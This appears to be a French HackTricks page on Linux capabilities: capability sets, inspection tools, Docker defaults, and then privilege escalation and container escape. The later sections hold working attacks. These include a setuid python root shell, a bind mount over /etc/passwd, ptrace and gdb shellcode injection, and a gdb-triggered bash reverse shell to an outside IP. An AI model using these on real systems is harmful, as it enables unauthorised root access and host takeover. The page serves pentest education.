# Capacités Linux

<details>

<summary><strong>Apprenez le piratage AWS de zéro à héros avec</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (Expert en équipe rouge AWS de HackTricks)</strong></a><strong>!</strong></summary>

Autres façons de soutenir HackTricks :

* Si vous souhaitez voir votre **entreprise annoncée dans HackTricks** ou **télécharger HackTricks en PDF**, consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop) !
* Obtenez le [**swag officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* Découvrez [**La famille PEASS**](https://opensea.io/collection/the-peass-family), notre collection exclusive de [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Rejoignez le** 💬 [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe Telegram**](https://t.me/peass) ou **suivez** moi sur **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Partagez vos astuces de piratage en soumettant des PR aux** [**HackTricks**](https://github.com/carlospolop/hacktricks) et [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) dépôts GitHub.

</details>

<figure><img src="https://files.gitbook.com/v0/b/gitbook-x-prod.appspot.com/o/spaces%2F-L_2uGJGU7AVNRcqRvEi%2Fuploads%2FelPCTwoecVdnsfjxCZtN%2Fimage.png?alt=media&#x26;token=9ee4ff3e-92dc-471c-abfe-1c25e446a6ed" alt=""><figcaption></figcaption></figure>

​​​​​​​​​[**RootedCON**](https://www.rootedcon.com/) est l'événement le plus pertinent en matière de cybersécurité en **Espagne** et l'un des plus importants en **Europe**. Avec **pour mission de promouvoir les connaissances techniques**, ce congrès est un point de rencontre bouillonnant pour les professionnels de la technologie et de la cybersécurité dans chaque discipline.\\

{% embed url="https://www.rootedcon.com/" %}

## Capacités Linux

Les capacités Linux divisent les **privilèges root en unités plus petites et distinctes**, permettant aux processus de disposer d'un sous-ensemble de privilèges. Cela réduit les risques en ne accordant pas inutilement des privilèges root complets.

### Le Problème :
- Les utilisateurs normaux ont des autorisations limitées, ce qui affecte des tâches comme l'ouverture d'un socket réseau qui nécessite un accès root.

### Ensembles de Capacités :

1. **Héritées (CapInh)** :
- **Objectif** : Détermine les capacités transmises par le processus parent.
- **Fonctionnalité** : Lorsqu'un nouveau processus est créé, il hérite des capacités de son parent dans cet ensemble. Utile pour maintenir certains privilèges à travers les spawns de processus.
- **Restrictions** : Un processus ne peut pas acquérir des capacités que son parent ne possédait pas.

2. **Effectives (CapEff)** :
- **Objectif** : Représente les capacités réelles qu'un processus utilise à tout moment.
- **Fonctionnalité** : C'est l'ensemble de capacités vérifié par le noyau pour accorder l'autorisation pour diverses opérations. Pour les fichiers, cet ensemble peut être un indicateur indiquant si les capacités autorisées du fichier doivent être considérées comme effectives.
- **Signification** : L'ensemble effectif est crucial pour les vérifications de privilèges immédiates, agissant comme l'ensemble actif de capacités qu'un processus peut utiliser.

3. **Autorisées (CapPrm)** :
- **Objectif** : Définit l'ensemble maximal de capacités qu'un processus peut posséder.
- **Fonctionnalité** : Un processus peut élever une capacité de l'ensemble autorisé à son ensemble effectif, lui donnant la possibilité d'utiliser cette capacité. Il peut également supprimer des capacités de son ensemble autorisé.
- **Limite** : Il agit comme une limite supérieure pour les capacités qu'un processus peut avoir, garantissant qu'un processus ne dépasse pas son champ de privilèges prédéfini.

4. **Limitation (CapBnd)** :
- **Objectif** : Met un plafond sur les capacités qu'un processus peut acquérir à tout moment de son cycle de vie.
- **Fonctionnalité** : Même si un processus a une certaine capacité dans son ensemble hérité ou autorisé, il ne peut pas acquérir cette capacité à moins qu'elle ne soit également dans l'ensemble de limitation.
- **Cas d'utilisation** : Cet ensemble est particulièrement utile pour restreindre le potentiel d'escalade de privilèges d'un processus, ajoutant une couche de sécurité supplémentaire.

5. **Ambiante (CapAmb)** :
- **Objectif** : Permet à certaines capacités d'être maintenues à travers un appel système `execve`, qui entraînerait normalement une réinitialisation complète des capacités du processus.
- **Fonctionnalité** : Garantit que les programmes non-SUID qui n'ont pas de capacités de fichier associées peuvent conserver certains privilèges.
- **Restrictions** : Les capacités de cet ensemble sont soumises aux contraintes des ensembles hérités et autorisés, garantissant qu'elles ne dépassent pas les privilèges autorisés du processus.
```python
# Code to demonstrate the interaction of different capability sets might look like this:
# Note: This is pseudo-code for illustrative purposes only.
def manage_capabilities(process):
if process.has_capability('cap_setpcap'):
process.add_capability_to_set('CapPrm', 'new_capability')
process.limit_capabilities('CapBnd')
process.preserve_capabilities_across_execve('CapAmb')
```
Pour plus d'informations, consultez :

* [https://blog.container-solutions.com/linux-capabilities-why-they-exist-and-how-they-work](https://blog.container-solutions.com/linux-capabilities-why-they-exist-and-how-they-work)
* [https://blog.ploetzli.ch/2014/understanding-linux-capabilities/](https://blog.ploetzli.ch/2014/understanding-linux-capabilities/)

## Capacités des Processus et des Binaires

### Capacités des Processus

Pour voir les capacités d'un processus particulier, utilisez le fichier **status** dans le répertoire /proc. Comme il fournit plus de détails, limitons-le uniquement aux informations liées aux capacités Linux.\
Notez que pour tous les processus en cours d'exécution, les informations sur les capacités sont maintenues par thread, pour les binaires dans le système de fichiers, elles sont stockées dans des attributs étendus.

Vous pouvez trouver les capacités définies dans /usr/include/linux/capability.h

Vous pouvez trouver les capacités du processus actuel en utilisant `cat /proc/self/status` ou en exécutant `capsh --print`, et celles des autres utilisateurs dans `/proc/<pid>/status`
```bash
cat /proc/1234/status | grep Cap
cat /proc/$$/status | grep Cap #This will print the capabilities of the current process
```
Ce commandement devrait renvoyer 5 lignes sur la plupart des systèmes.

* CapInh = Capacités héritées
* CapPrm = Capacités autorisées
* CapEff = Capacités effectives
* CapBnd = Ensemble de limitation
* CapAmb = Ensemble de capacités ambiantes
```bash
#These are the typical capabilities of a root owned process (all)
CapInh: 0000000000000000
CapPrm: 0000003fffffffff
CapEff: 0000003fffffffff
CapBnd: 0000003fffffffff
CapAmb: 0000000000000000
```
Ces nombres hexadécimaux n'ont pas de sens. En utilisant l'utilitaire capsh, nous pouvons les décoder en noms de capacités.
```bash
capsh --decode=0000003fffffffff
0x0000003fffffffff=cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_linux_immutable,cap_net_bind_service,cap_net_broadcast,cap_net_admin,cap_net_raw,cap_ipc_lock,cap_ipc_owner,cap_sys_module,cap_sys_rawio,cap_sys_chroot,cap_sys_ptrace,cap_sys_pacct,cap_sys_admin,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,cap_setfcap,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,37
```
Vérifions maintenant les **capacités** utilisées par `ping` :
```bash
cat /proc/9491/status | grep Cap
CapInh:    0000000000000000
CapPrm:    0000000000003000
CapEff:    0000000000000000
CapBnd:    0000003fffffffff
CapAmb:    0000000000000000

capsh --decode=0000000000003000
0x0000000000003000=cap_net_admin,cap_net_raw
```
Bien que cela fonctionne, il existe une autre manière plus simple. Pour voir les capacités d'un processus en cours d'exécution, utilisez simplement l'outil **getpcaps** suivi de son identifiant de processus (PID). Vous pouvez également fournir une liste d'identifiants de processus.
```bash
getpcaps 1234
```
Vérifions ici les capacités de `tcpdump` après avoir donné suffisamment de capacités au binaire (`cap_net_admin` et `cap_net_raw`) pour écouter le réseau (_tcpdump s'exécute dans le processus 9562_):
```bash
#The following command give tcpdump the needed capabilities to sniff traffic
$ setcap cap_net_raw,cap_net_admin=eip /usr/sbin/tcpdump

$ getpcaps 9562
Capabilities for `9562': = cap_net_admin,cap_net_raw+ep

$ cat /proc/9562/status | grep Cap
CapInh:    0000000000000000
CapPrm:    0000000000003000
CapEff:    0000000000003000
CapBnd:    0000003fffffffff
CapAmb:    0000000000000000

$ capsh --decode=0000000000003000
0x0000000000003000=cap_net_admin,cap_net_raw
```
Comme vous pouvez le constater, les capacités données correspondent aux résultats des 2 façons d'obtenir les capacités d'un binaire.\
L'outil _getpcaps_ utilise l'appel système **capget()** pour interroger les capacités disponibles pour un thread particulier. Cet appel système n'a besoin que du PID pour obtenir plus d'informations.

### Capacités des Binaires

Les binaires peuvent avoir des capacités qui peuvent être utilisées lors de l'exécution. Par exemple, il est très courant de trouver le binaire `ping` avec la capacité `cap_net_raw`:
```bash
getcap /usr/bin/ping
/usr/bin/ping = cap_net_raw+ep
```
Vous pouvez **rechercher des binaires avec des capacités** en utilisant :
```bash
getcap -r / 2>/dev/null
```
### Suppression des capacités avec capsh

Si nous supprimons les capacités CAP\_NET\_RAW pour _ping_, alors l'utilitaire ping ne devrait plus fonctionner.
```bash
capsh --drop=cap_net_raw --print -- -c "tcpdump"
```
Outre la sortie de _capsh_ elle-même, la commande _tcpdump_ devrait également générer une erreur.

> /bin/bash: /usr/sbin/tcpdump: Operation not permitted

L'erreur montre clairement que la commande ping n'est pas autorisée à ouvrir un socket ICMP. Maintenant, nous savons avec certitude que cela fonctionne comme prévu.

### Supprimer les capacités

Vous pouvez supprimer les capacités d'un binaire avec
```bash
setcap -r </path/to/binary>
```
## Capacités de l'utilisateur

Apparemment, **il est possible d'attribuer des capacités également aux utilisateurs**. Cela signifie probablement que chaque processus exécuté par l'utilisateur pourra utiliser les capacités de l'utilisateur.\
Basé sur [ceci](https://unix.stackexchange.com/questions/454708/how-do-you-add-cap-sys-admin-permissions-to-user-in-centos-7), [ceci](http://manpages.ubuntu.com/manpages/bionic/man5/capability.conf.5.html) et [ceci](https://stackoverflow.com/questions/1956732/is-it-possible-to-configure-linux-capabilities-per-user) quelques fichiers doivent être configurés pour donner à un utilisateur certaines capacités, mais celui qui attribue les capacités à chaque utilisateur sera `/etc/security/capability.conf`.\
Exemple de fichier:
```bash
# Simple
cap_sys_ptrace               developer
cap_net_raw                  user1

# Multiple capablities
cap_net_admin,cap_net_raw    jrnetadmin
# Identical, but with numeric values
12,13                        jrnetadmin

# Combining names and numerics
cap_sys_admin,22,25          jrsysadmin
```
## Capacités de l'environnement

En compilant le programme suivant, il est possible de **créer un shell bash à l'intérieur d'un environnement qui fournit des capacités**.

{% code title="ambient.c" %}
```c
/*
* Test program for the ambient capabilities
*
* compile using:
* gcc -Wl,--no-as-needed -lcap-ng -o ambient ambient.c
* Set effective, inherited and permitted capabilities to the compiled binary
* sudo setcap cap_setpcap,cap_net_raw,cap_net_admin,cap_sys_nice+eip ambient
*
* To get a shell with additional caps that can be inherited do:
*
* ./ambient /bin/bash
*/

#include <stdlib.h>
#include <stdio.h>
#include <string.h>
#include <errno.h>
#include <sys/prctl.h>
#include <linux/capability.h>
#include <cap-ng.h>

static void set_ambient_cap(int cap) {
int rc;
capng_get_caps_process();
rc = capng_update(CAPNG_ADD, CAPNG_INHERITABLE, cap);
if (rc) {
printf("Cannot add inheritable cap\n");
exit(2);
}
capng_apply(CAPNG_SELECT_CAPS);
/* Note the two 0s at the end. Kernel checks for these */
if (prctl(PR_CAP_AMBIENT, PR_CAP_AMBIENT_RAISE, cap, 0, 0)) {
perror("Cannot set cap");
exit(1);
}
}
void usage(const char * me) {
printf("Usage: %s [-c caps] new-program new-args\n", me);
exit(1);
}
int default_caplist[] = {
CAP_NET_RAW,
CAP_NET_ADMIN,
CAP_SYS_NICE,
-1
};
int * get_caplist(const char * arg) {
int i = 1;
int * list = NULL;
char * dup = strdup(arg), * tok;
for (tok = strtok(dup, ","); tok; tok = strtok(NULL, ",")) {
list = realloc(list, (i + 1) * sizeof(int));
if (!list) {
perror("out of memory");
exit(1);
}
list[i - 1] = atoi(tok);
list[i] = -1;
i++;
}
return list;
}
int main(int argc, char ** argv) {
int rc, i, gotcaps = 0;
int * caplist = NULL;
int index = 1; // argv index for cmd to start
if (argc < 2)
usage(argv[0]);
if (strcmp(argv[1], "-c") == 0) {
if (argc <= 3) {
usage(argv[0]);
}
caplist = get_caplist(argv[2]);
index = 3;
}
if (!caplist) {
caplist = (int * ) default_caplist;
}
for (i = 0; caplist[i] != -1; i++) {
printf("adding %d to ambient list\n", caplist[i]);
set_ambient_cap(caplist[i]);
}
printf("Ambient forking shell\n");
if (execv(argv[index], argv + index))
perror("Cannot exec");
return 0;
}
```
{% endcode %}
```bash
gcc -Wl,--no-as-needed -lcap-ng -o ambient ambient.c
sudo setcap cap_setpcap,cap_net_raw,cap_net_admin,cap_sys_nice+eip ambient
./ambient /bin/bash
```
À l'intérieur du **bash exécuté par le binaire ambiant compilé**, il est possible d'observer les **nouvelles capacités** (un utilisateur régulier n'aura aucune capacité dans la section "actuelle").
```bash
capsh --print
Current: = cap_net_admin,cap_net_raw,cap_sys_nice+eip
```
{% hint style="danger" %}
Vous ne pouvez **ajouter que des capacités présentes** à la fois dans les ensembles autorisés et héritables.
{% endhint %}

### Binaires conscients des capacités / Binaires ignorants des capacités

Les **binaires conscients des capacités n'utiliseront pas les nouvelles capacités** données par l'environnement, tandis que les **binaires ignorants des capacités les utiliseront** car ils ne les rejettent pas. Cela rend les binaires ignorants des capacités vulnérables à l'intérieur d'un environnement spécial qui accorde des capacités aux binaires.

## Capacités de service

Par défaut, un **service s'exécutant en tant que root se verra attribuer toutes les capacités**, ce qui peut parfois être dangereux.\
Par conséquent, un fichier de **configuration du service** permet de **spécifier** les **capacités** que vous souhaitez lui attribuer, **et** l'**utilisateur** qui devrait exécuter le service pour éviter d'exécuter un service avec des privilèges inutiles:
```bash
[Service]
User=bob
AmbientCapabilities=CAP_NET_BIND_SERVICE
```
## Capacités dans les conteneurs Docker

Par défaut, Docker attribue quelques capacités aux conteneurs. Il est très facile de vérifier quelles sont ces capacités en exécutant :
```bash
docker run --rm -it  r.j3ss.co/amicontained bash
Capabilities:
BOUNDING -> chown dac_override fowner fsetid kill setgid setuid setpcap net_bind_service net_raw sys_chroot mknod audit_write setfcap

# Add a capabilities
docker run --rm -it --cap-add=SYS_ADMIN r.j3ss.co/amicontained bash

# Add all capabilities
docker run --rm -it --cap-add=ALL r.j3ss.co/amicontained bash

# Remove all and add only one
docker run --rm -it  --cap-drop=ALL --cap-add=SYS_PTRACE r.j3ss.co/amicontained bash
```
<figure><img src="https://files.gitbook.com/v0/b/gitbook-x-prod.appspot.com/o/spaces%2F-L_2uGJGU7AVNRcqRvEi%2Fuploads%2FelPCTwoecVdnsfjxCZtN%2Fimage.png?alt=media&#x26;token=9ee4ff3e-92dc-471c-abfe-1c25e446a6ed" alt=""><figcaption></figcaption></figure>

​​​​​​​​​​[**RootedCON**](https://www.rootedcon.com/) est l'événement le plus pertinent en matière de cybersécurité en **Espagne** et l'un des plus importants en **Europe**. Avec **pour mission de promouvoir les connaissances techniques**, ce congrès est un point de rencontre bouillonnant pour les professionnels de la technologie et de la cybersécurité dans chaque discipline.

{% embed url="https://www.rootedcon.com/" %}

## Privesc/Évasion de conteneur

Les capacités sont utiles lorsque vous **voulez restreindre vos propres processus après avoir effectué des opérations privilégiées** (par exemple, après avoir configuré un chroot et lié à un socket). Cependant, elles peuvent être exploitées en leur transmettant des commandes ou des arguments malveillants qui sont ensuite exécutés en tant que root.

Vous pouvez forcer des capacités sur des programmes en utilisant `setcap`, et les interroger en utilisant `getcap`:
```bash
#Set Capability
setcap cap_net_raw+ep /sbin/ping

#Get Capability
getcap /sbin/ping
/sbin/ping = cap_net_raw+ep
```
Le `+ep` signifie que vous ajoutez la capacité ("-" la supprimerait) en tant qu'Effective et Permitted.

Pour identifier les programmes dans un système ou un dossier avec des capacités :
```bash
getcap -r / 2>/dev/null
```
### Exemple d'exploitation

Dans l'exemple suivant, le binaire `/usr/bin/python2.6` est trouvé vulnérable à l'élévation de privilèges :
```bash
setcap cap_setuid+ep /usr/bin/python2.7
/usr/bin/python2.7 = cap_setuid+ep

#Exploit
/usr/bin/python2.7 -c 'import os; os.setuid(0); os.system("/bin/bash");'
```
**Capacités** nécessaires par `tcpdump` pour **permettre à n'importe quel utilisateur de capturer des paquets**:
```bash
setcap cap_net_raw,cap_net_admin=eip /usr/sbin/tcpdump
getcap /usr/sbin/tcpdump
/usr/sbin/tcpdump = cap_net_admin,cap_net_raw+eip
```
### Le cas spécial des capacités "vides"

[D'après la documentation](https://man7.org/linux/man-pages/man7/capabilities.7.html) : Notez qu'il est possible d'attribuer des ensembles de capacités vides à un fichier de programme, et il est donc possible de créer un programme avec un ensemble d'identifiants utilisateur définis par l'utilisateur qui modifie l'identifiant utilisateur effectif et enregistré du processus qui exécute le programme en 0, mais ne confère aucune capacité à ce processus. Autrement dit, si vous avez un binaire qui :

1. n'est pas détenu par root
2. n'a pas les bits `SUID`/`SGID` définis
3. a un ensemble de capacités vide (par exemple : `getcap myelf` renvoie `myelf =ep`)

alors **ce binaire s'exécutera en tant que root**.

## CAP\_SYS\_ADMIN

**[`CAP_SYS_ADMIN`](https://man7.org/linux/man-pages/man7/capabilities.7.html)** est une capacité Linux très puissante, souvent assimilée à un niveau quasi-root en raison de ses **privilèges administratifs** étendus, tels que le montage de périphériques ou la manipulation des fonctionnalités du noyau. Bien qu'indispensable pour les conteneurs simulant des systèmes entiers, **`CAP_SYS_ADMIN` pose d'importants défis en matière de sécurité**, notamment dans les environnements conteneurisés, en raison de son potentiel d'escalade de privilèges et de compromission du système. Par conséquent, son utilisation nécessite des évaluations de sécurité rigoureuses et une gestion prudente, avec une forte préférence pour la suppression de cette capacité dans les conteneurs spécifiques à une application afin de respecter le **principe du moindre privilège** et de réduire au minimum la surface d'attaque.

**Exemple avec un binaire**
```bash
getcap -r / 2>/dev/null
/usr/bin/python2.7 = cap_sys_admin+ep
```
En utilisant python, vous pouvez monter un fichier _passwd_ modifié sur le vrai fichier _passwd_:
```bash
cp /etc/passwd ./ #Create a copy of the passwd file
openssl passwd -1 -salt abc password #Get hash of "password"
vim ./passwd #Change roots passwords of the fake passwd file
```
Et enfin **monter** le fichier `passwd` modifié sur `/etc/passwd`:
```python
from ctypes import *
libc = CDLL("libc.so.6")
libc.mount.argtypes = (c_char_p, c_char_p, c_char_p, c_ulong, c_char_p)
MS_BIND = 4096
source = b"/path/to/fake/passwd"
target = b"/etc/passwd"
filesystemtype = b"none"
options = b"rw"
mountflags = MS_BIND
libc.mount(source, target, filesystemtype, mountflags, options)
```
Et vous pourrez **`su` en tant que root** en utilisant le mot de passe "password".

**Exemple avec l'environnement (évasion de Docker)**

Vous pouvez vérifier les capacités activées à l'intérieur du conteneur Docker en utilisant :
```
capsh --print
Current: = cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_linux_immutable,cap_net_bind_service,cap_net_broadcast,cap_net_admin,cap_net_raw,cap_ipc_lock,cap_ipc_owner,cap_sys_module,cap_sys_rawio,cap_sys_chroot,cap_sys_ptrace,cap_sys_pacct,cap_sys_admin,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,cap_setfcap,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,cap_audit_read+ep
Bounding set =cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_linux_immutable,cap_net_bind_service,cap_net_broadcast,cap_net_admin,cap_net_raw,cap_ipc_lock,cap_ipc_owner,cap_sys_module,cap_sys_rawio,cap_sys_chroot,cap_sys_ptrace,cap_sys_pacct,cap_sys_admin,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,cap_setfcap,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,cap_audit_read
Securebits: 00/0x0/1'b0
secure-noroot: no (unlocked)
secure-no-suid-fixup: no (unlocked)
secure-keep-caps: no (unlocked)
uid=0(root)
gid=0(root)
groups=0(root)
```
À l'intérieur de la sortie précédente, vous pouvez voir que la capacité SYS_ADMIN est activée.

* **Mount**

Cela permet au conteneur docker de **monter le disque hôte et d'y accéder librement**:
```bash
fdisk -l #Get disk name
Disk /dev/sda: 4 GiB, 4294967296 bytes, 8388608 sectors
Units: sectors of 1 * 512 = 512 bytes
Sector size (logical/physical): 512 bytes / 512 bytes
I/O size (minimum/optimal): 512 bytes / 512 bytes

mount /dev/sda /mnt/ #Mount it
cd /mnt
chroot ./ bash #You have a shell inside the docker hosts disk
```
* **Accès complet**

Dans la méthode précédente, nous avons réussi à accéder au disque hôte de Docker.\
Au cas où vous constateriez que l'hôte exécute un serveur **ssh**, vous pourriez **créer un utilisateur à l'intérieur du disque de l'hôte Docker** et y accéder via SSH:
```bash
#Like in the example before, the first step is to mount the docker host disk
fdisk -l
mount /dev/sda /mnt/

#Then, search for open ports inside the docker host
nc -v -n -w2 -z 172.17.0.1 1-65535
(UNKNOWN) [172.17.0.1] 2222 (?) open

#Finally, create a new user inside the docker host and use it to access via SSH
chroot /mnt/ adduser john
ssh john@172.17.0.1 -p 2222
```
## CAP\_SYS\_PTRACE

**Cela signifie que vous pouvez échapper au conteneur en injectant un shellcode à l'intérieur d'un processus s'exécutant dans l'hôte.** Pour accéder aux processus s'exécutant dans l'hôte, le conteneur doit être exécuté au moins avec **`--pid=host`**.

**[`CAP_SYS_PTRACE`](https://man7.org/linux/man-pages/man7/capabilities.7.html)** accorde la capacité d'utiliser les fonctionnalités de débogage et de traçage des appels système fournies par `ptrace(2)` et les appels d'attachement de mémoire croisée comme `process_vm_readv(2)` et `process_vm_writev(2)`. Bien que puissant à des fins de diagnostic et de surveillance, si `CAP_SYS_PTRACE` est activé sans mesures restrictives comme un filtre seccomp sur `ptrace(2)`, cela peut sérieusement compromettre la sécurité du système. Plus précisément, il peut être exploité pour contourner d'autres restrictions de sécurité, notamment celles imposées par seccomp, comme le démontrent des [preuves de concept (PoC) comme celle-ci](https://gist.github.com/thejh/8346f47e359adecd1d53).

**Exemple avec un binaire (python)**
```bash
getcap -r / 2>/dev/null
/usr/bin/python2.7 = cap_sys_ptrace+ep
```

```python
import ctypes
import sys
import struct
# Macros defined in <sys/ptrace.h>
# https://code.woboq.org/qt5/include/sys/ptrace.h.html
PTRACE_POKETEXT = 4
PTRACE_GETREGS = 12
PTRACE_SETREGS = 13
PTRACE_ATTACH = 16
PTRACE_DETACH = 17
# Structure defined in <sys/user.h>
# https://code.woboq.org/qt5/include/sys/user.h.html#user_regs_struct
class user_regs_struct(ctypes.Structure):
_fields_ = [
("r15", ctypes.c_ulonglong),
("r14", ctypes.c_ulonglong),
("r13", ctypes.c_ulonglong),
("r12", ctypes.c_ulonglong),
("rbp", ctypes.c_ulonglong),
("rbx", ctypes.c_ulonglong),
("r11", ctypes.c_ulonglong),
("r10", ctypes.c_ulonglong),
("r9", ctypes.c_ulonglong),
("r8", ctypes.c_ulonglong),
("rax", ctypes.c_ulonglong),
("rcx", ctypes.c_ulonglong),
("rdx", ctypes.c_ulonglong),
("rsi", ctypes.c_ulonglong),
("rdi", ctypes.c_ulonglong),
("orig_rax", ctypes.c_ulonglong),
("rip", ctypes.c_ulonglong),
("cs", ctypes.c_ulonglong),
("eflags", ctypes.c_ulonglong),
("rsp", ctypes.c_ulonglong),
("ss", ctypes.c_ulonglong),
("fs_base", ctypes.c_ulonglong),
("gs_base", ctypes.c_ulonglong),
("ds", ctypes.c_ulonglong),
("es", ctypes.c_ulonglong),
("fs", ctypes.c_ulonglong),
("gs", ctypes.c_ulonglong),
]

libc = ctypes.CDLL("libc.so.6")

pid=int(sys.argv[1])

# Define argument type and respone type.
libc.ptrace.argtypes = [ctypes.c_uint64, ctypes.c_uint64, ctypes.c_void_p, ctypes.c_void_p]
libc.ptrace.restype = ctypes.c_uint64

# Attach to the process
libc.ptrace(PTRACE_ATTACH, pid, None, None)
registers=user_regs_struct()

# Retrieve the value stored in registers
libc.ptrace(PTRACE_GETREGS, pid, None, ctypes.byref(registers))
print("Instruction Pointer: " + hex(registers.rip))
print("Injecting Shellcode at: " + hex(registers.rip))

# Shell code copied from exploit db. https://github.com/0x00pf/0x00sec_code/blob/master/mem_inject/infect.c
shellcode = "\x48\x31\xc0\x48\x31\xd2\x48\x31\xf6\xff\xc6\x6a\x29\x58\x6a\x02\x5f\x0f\x05\x48\x97\x6a\x02\x66\xc7\x44\x24\x02\x15\xe0\x54\x5e\x52\x6a\x31\x58\x6a\x10\x5a\x0f\x05\x5e\x6a\x32\x58\x0f\x05\x6a\x2b\x58\x0f\x05\x48\x97\x6a\x03\x5e\xff\xce\xb0\x21\x0f\x05\x75\xf8\xf7\xe6\x52\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x48\x8d\x3c\x24\xb0\x3b\x0f\x05"

# Inject the shellcode into the running process byte by byte.
for i in xrange(0,len(shellcode),4):
# Convert the byte to little endian.
shellcode_byte_int=int(shellcode[i:4+i].encode('hex'),16)
shellcode_byte_little_endian=struct.pack("<I", shellcode_byte_int).rstrip('\x00').encode('hex')
shellcode_byte=int(shellcode_byte_little_endian,16)

# Inject the byte.
libc.ptrace(PTRACE_POKETEXT, pid, ctypes.c_void_p(registers.rip+i),shellcode_byte)

print("Shellcode Injected!!")

# Modify the instuction pointer
registers.rip=registers.rip+2

# Set the registers
libc.ptrace(PTRACE_SETREGS, pid, None, ctypes.byref(registers))
print("Final Instruction Pointer: " + hex(registers.rip))

# Detach from the process.
libc.ptrace(PTRACE_DETACH, pid, None, None)
```
**Exemple avec binaire (gdb)**

`gdb` avec la capacité `ptrace`:
```
/usr/bin/gdb = cap_sys_ptrace+ep
```
Créez un shellcode avec msfvenom pour l'injecter en mémoire via gdb
```python
# msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.14.11 LPORT=9001 -f py -o revshell.py
buf =  b""
buf += b"\x6a\x29\x58\x99\x6a\x02\x5f\x6a\x01\x5e\x0f\x05"
buf += b"\x48\x97\x48\xb9\x02\x00\x23\x29\x0a\x0a\x0e\x0b"
buf += b"\x51\x48\x89\xe6\x6a\x10\x5a\x6a\x2a\x58\x0f\x05"
buf += b"\x6a\x03\x5e\x48\xff\xce\x6a\x21\x58\x0f\x05\x75"
buf += b"\xf6\x6a\x3b\x58\x99\x48\xbb\x2f\x62\x69\x6e\x2f"
buf += b"\x73\x68\x00\x53\x48\x89\xe7\x52\x57\x48\x89\xe6"
buf += b"\x0f\x05"

# Divisible by 8
payload = b"\x90" * (8 - len(buf) % 8 ) + buf

# Change endianess and print gdb lines to load the shellcode in RIP directly
for i in range(0, len(buf), 8):
chunk = payload[i:i+8][::-1]
chunks = "0x"
for byte in chunk:
chunks += f"{byte:02x}"

print(f"set {{long}}($rip+{i}) = {chunks}")
```
Déboguer un processus root avec gdb et copier-coller les lignes gdb précédemment générées :
```bash
# In this case there was a sleep run by root
## NOTE that the process you abuse will die after the shellcode
/usr/bin/gdb -p $(pgrep sleep)
[...]
(gdb) set {long}($rip+0) = 0x296a909090909090
(gdb) set {long}($rip+8) = 0x5e016a5f026a9958
(gdb) set {long}($rip+16) = 0x0002b9489748050f
(gdb) set {long}($rip+24) = 0x48510b0e0a0a2923
(gdb) set {long}($rip+32) = 0x582a6a5a106ae689
(gdb) set {long}($rip+40) = 0xceff485e036a050f
(gdb) set {long}($rip+48) = 0x6af675050f58216a
(gdb) set {long}($rip+56) = 0x69622fbb4899583b
(gdb) set {long}($rip+64) = 0x8948530068732f6e
(gdb) set {long}($rip+72) = 0x050fe689485752e7
(gdb) c
Continuing.
process 207009 is executing new program: /usr/bin/dash
[...]
```
**Exemple avec l'environnement (évasion de Docker) - Autre abus de gdb**

Si **GDB** est installé (ou vous pouvez l'installer avec `apk add gdb` ou `apt install gdb` par exemple) vous pouvez **déboguer un processus depuis l'hôte** et le faire appeler la fonction `system`. (Cette technique nécessite également la capacité `SYS_ADMIN`).
```bash
gdb -p 1234
(gdb) call (void)system("ls")
(gdb) call (void)system("sleep 5")
(gdb) call (void)system("bash -c 'bash -i >& /dev/tcp/192.168.115.135/5656 0>&1'")
```
Vous ne pourrez pas voir la sortie de la commande exécutée mais elle sera exécutée par ce processus (donc obtenez un shell inversé).

{% hint style="warning" %}
Si vous obtenez l'erreur "No symbol "system" in current context.", vérifiez l'exemple précédent en chargeant un shellcode dans un programme via gdb.
{% endhint %}

**Exemple avec l'environnement (évasion de Docker) - Injection de shellcode**

Vous pouvez vérifier les capacités activées à l'intérieur du conteneur Docker en utilisant :
```bash
capsh --print
Current: = cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_sys_ptrace,cap_mknod,cap_audit_write,cap_setfcap+ep
Bounding set =cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_sys_ptrace,cap_mknod,cap_audit_write,cap_setfcap
Securebits: 00/0x0/1'b0
secure-noroot: no (unlocked)
secure-no-suid-fixup: no (unlocked)
secure-keep-caps: no (unlocked)
uid=0(root)
gid=0(root)
groups=0(root
```
Lister les **processus** en cours d'exécution sur l'**hôte** `ps -eaf`

1. Obtenir l'**architecture** `uname -m`
2. Trouver un **shellcode** pour l'architecture ([https://www.exploit-db.com/exploits/41128](https://www.exploit-db.com/exploits/41128))
3. Trouver un **programme** pour **injecter** le **shellcode** dans la mémoire d'un processus ([https://github.com/0x00pf/0x00sec\_code/blob/master/mem\_inject/infect.c](https://github.com/0x00pf/0x00sec\_code/blob/master/mem\_inject/infect.c))
4. **Modifier** le **shellcode** à l'intérieur du programme et le **compiler** `gcc inject.c -o inject`
